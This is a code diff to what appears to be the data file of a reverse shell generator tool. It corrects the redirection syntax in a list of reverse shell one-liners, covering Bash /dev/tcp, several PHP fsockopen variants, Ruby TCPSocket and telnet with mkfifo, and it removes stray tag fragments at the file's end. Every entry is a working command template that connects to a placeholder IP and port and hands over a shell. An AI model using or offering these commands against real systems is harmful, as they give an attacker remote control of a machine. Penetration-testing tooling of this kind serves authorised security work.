@@ -26,12 +26,12 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "Bash 196",
-            "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196>&196 2>&196",
+            "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
             "meta": ["linux", "mac"]
         },
         {
             "name": "Bash read line",
-            "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 2 | while read line; do $line>&5 >&5; done",
+            "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
             "meta": ["linux", "mac"]
         },
         {
@@ -121,32 +121,32 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "PHP exec",
-            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3>&3 2>&3\");'",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
             "meta": ["linux", , "mac"]
         },
         {
             "name": "PHP shell_exec",
-            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3>&3 2>&3\");'",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
             "meta": ["linux", "mac"]
         },
         {
             "name": "PHP system",
-            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3>&3 2>&3\");'",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
             "meta": ["linux", "windows", "mac"]
         },
         {
             "name": "PHP passthru",
-            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3>&3 2>&3\");'",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
             "meta": ["linux", "mac"]
         },
         {
             "name": "PHP `",
-            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3>&3 2>&3`;'",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
             "meta": ["linux", "windows", "mac"]
         },
         {
             "name": "PHP popen",
-            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3>&3 2>&3\", \"r\");'",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
             "meta": ["linux", "windows", "mac"]
         },
         {
@@ -200,7 +200,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "Ruby #1",
-            "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d>&%d 2>&%d\",f,f,f)'",
+            "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'",
             "meta": ["linux", "mac"]
         },
         {
@@ -230,7 +230,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "telnet",
-            "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF 1 | {shell}>$TF",
+            "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
             "meta": ["linux", "mac"]
         },
         {
@@ -387,4 +387,3 @@ const rsgData = {
 if (typeof exports !== 'undefined') {
     exports.rsgData = rsgData;
 }
-</$TF></&%d></&3></&3></&3></&3></&3></&3></\";$🤠=\"></&5></&5></&196></&196;exec>
